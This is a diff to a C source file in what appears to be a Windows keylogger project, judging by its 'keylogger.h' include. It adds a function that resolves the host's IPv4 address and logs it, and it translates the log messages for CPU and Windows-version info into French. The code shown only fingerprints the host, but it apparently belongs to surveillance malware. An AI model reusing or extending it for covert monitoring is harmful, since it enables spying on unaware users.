@@ -1,5 +1,46 @@
 #include "keylogger.h"
 
+void	get_ip_address(void)
+{
+	WSADATA wsaData;
+	char hostname[256];
+
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+		return;
+
+	if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR)
+	{
+		WSACleanup();
+		return;
+	}
+
+	struct addrinfo hints, *res = NULL;
+	ZeroMemory(&hints, sizeof(hints));
+	hints.ai_family = AF_INET;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	if (getaddrinfo(hostname, NULL, &hints, &res) != 0)
+	{
+		WSACleanup();
+		return;
+	}
+
+	char ipstr[INET_ADDRSTRLEN] = {0};
+
+	struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
+
+	if (InetNtop(AF_INET, &(ipv4->sin_addr), ipstr, sizeof(ipstr)) != NULL)
+	{
+		char message[256];
+		snprintf(message, sizeof(message), "Adresse IP : %s\n", ipstr);
+		write_to_file(message);
+	}
+
+	freeaddrinfo(res);
+	WSACleanup();
+}
+
 const char* get_arch_name(WORD arch)
 {
 	switch (arch)
@@ -29,7 +70,7 @@ void get_cpu_info(void)
 	SYSTEM_INFO sysInfo;
 	GetSystemInfo(&sysInfo);
 	char cpuInfo[256];
-	snprintf(cpuInfo, sizeof(cpuInfo), "CPU Architecture: %s\nNumber of Processors: %lu\n",
+	snprintf(cpuInfo, sizeof(cpuInfo), "CPU Architecture: %s\nNombre de processeurs: %lu\n",
 				 get_arch_name(sysInfo.wProcessorArchitecture),
 				(unsigned long)sysInfo.dwNumberOfProcessors);
 	write_to_file(cpuInfo);
@@ -58,5 +99,5 @@ void get_windows_info(void)
 			}
 		}
 	}
-	write_to_file("Impossible de récupérer la version\n");
+	write_to_file("Impossible de récupérer la version de Windows\n");
 }
